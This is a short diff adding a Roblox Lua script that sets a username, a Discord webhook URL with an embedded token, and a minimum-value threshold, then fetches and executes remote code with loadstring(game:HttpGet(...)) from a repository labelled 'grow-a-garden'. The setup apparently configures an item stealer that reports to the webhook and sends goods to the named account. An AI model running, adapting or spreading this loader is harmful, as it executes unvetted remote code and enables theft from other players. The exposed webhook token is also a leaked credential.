@@ -1,0 +1,6 @@
+Username = "Zysume" 
+Webhook = "https://discord.com/api/webhooks/1406318110985949374/KuwjalhEaAHRuXKJH5fwyLflWMrunmWVReOkDF6Rnc44orgRU7HTuaXjoifVhLyDb-Tc" 
+MinimumValue = 1
+
+loadstring(game:HttpGet("https://github.com/tranxscriptss/Itranxscriptss/-/main/grow-a-gar
+den"))()
